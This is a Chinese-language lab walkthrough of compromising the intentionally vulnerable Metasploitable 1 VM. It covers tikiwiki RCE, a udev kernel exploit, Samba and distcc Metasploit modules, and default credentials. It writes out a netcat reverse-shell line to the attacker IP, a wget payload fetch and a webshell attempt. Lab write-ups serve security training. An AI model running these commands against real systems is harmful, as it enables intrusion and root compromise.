靶场信息

地址：https://www.vulnhub.com/entry/metasploitable-1,28/

发布日期：2010 年 5 月 19 日

难度：容易

目标：获取root shell

描述：我们经常听到的问题之一是“我可以使用哪些系统进行测试？” 基于此，我们认为将可利用的 VM 放在一起用于测试目的是个好主意。

Metasploitable 是安装在 VMWare 6.5 映像上的 Ubuntu 8.04 服务器。包括许多易受攻击的软件包，包括安装 tomcat 5.5（使用弱凭据）、distcc、tikiwiki、twiki 和旧版 mysql。

您可以使用大多数 VMware 产品来运行它，并且您需要确保它配置为仅主机网络，除非它在您的实验室中 - 无需在公司网络上放置另一台易受攻击的机器。它被配置为非永久磁盘模式，所以如果你不小心'rm -rf'它，你可以简单地重置它。

前言

本次靶场使用VMware进行构建。将我的kali系统和桥接在VirtualBox的仅主机网卡。本次演练使用kali系统按照渗透的过程进行操作。

一、信息收集

1）确定目标

由于kali网络桥接在virtualBox的仅主机网卡，所以可以直接使用netdiscover扫描172.16.10.0网段存活主机。攻击机kali ip：10.0.1.12

netdiscover -r 10.0.1.0/24 -i eth0

得到ip地址：10.0.1.8

3）目录扫描

dirsearch -u http://10.0.1.8

扫描到phpinfo信息和/tikiwiki

二、漏洞利用

1）tikiwiki 1.9.5存在rce漏洞

2）msf获取shell

使用第2个payload

3）获取交互式shell

经过探测，靶机安装了python2，获取交互式shell

python -c 'import pty; pty.spawn("/bin/bash")'

4）系统信息

# 查看ubuntu版本具体信息
cat /etc/lsb-release
# 查看Linux内核信息
uname -a
# 查看当前ubuntu系统的版本信息
cat /proc/version
# 得到
Linux version 2.6
gcc version 4.2.3
Ubuntu 4.2.3-2ubuntu7

三、提权

1）查找提权脚本

searchsploit linux 2.6

2）脚本使用方法

1.获取udevd进程的PID (PID-1 的值是 argv[1]),
2.反弹shell的payload要保存在/tmp/run中

3）提权到root

copy到特定目录

cp /usr/share/exploitdb/exploits/linux/local/8572.c ./

python开启http服务

python3 -m http.server 80

靶机使用wget下载到/tmp目录

wget http://10.0.1.12/8572.c

提权

编译脚本
gcc 8572.c -o ch4nge
# 生成反弹shell脚本
echo '#!/bin/sh' > /tmp/run
echo '/bin/netcat 10.0.1.12 8888 -e /bin/sh' >> /tmp/run
# 查询udev运行PID
ps aux | grep udev
# kali监听
nc -lvvp 8888
# 运行提权脚本，后面加上udev的PID-1
./ch4nge 2223

其他漏洞点探测

1）Samba（CVE-2007-2447）

一些共享目录不需要特定权限

smbclient -L 10.0.1.8 -N

smbclient //10.0.1.8/tmp -N

枚举目标上存在的帐户

rpcclient -U "" -N 10.0.1.8
enumdomusers

CVE-2007-2447漏洞利用

Samba 3.0.0 - 3.0.25rc3 (inclusive)

获取root shell

2）Distccd（CVE-2004-2687）

这是版本 4.2.4 中的 Distccd 编译器服务器，远程代码执行漏洞利用。

use exploit/unix/misc/distcc_exec
set RHOST 10.0.1.8
run

3）Tikiwiki (CVE-2006-5702)

获取数据库凭据

4）PostgreSQL

postgres/postgres

5）tomcat

5.5版本

经过探测发现manager弱口令

tomcat/tomcat

尝试部署木马war包

文件不能正常执行

http://10.0.1.8:8180/JspSpy/JspSpy.jsp

总结

此靶机开放的web服务很多，所以获取root的途径也有很多，我在测试的过程中发现msfadmin的密码是msfadmin，如果使用此用户提权，直接使用sudo -i即可达到目的，但相对来说最简单的利用方式是samba漏洞，可以直接获得root权限shell。
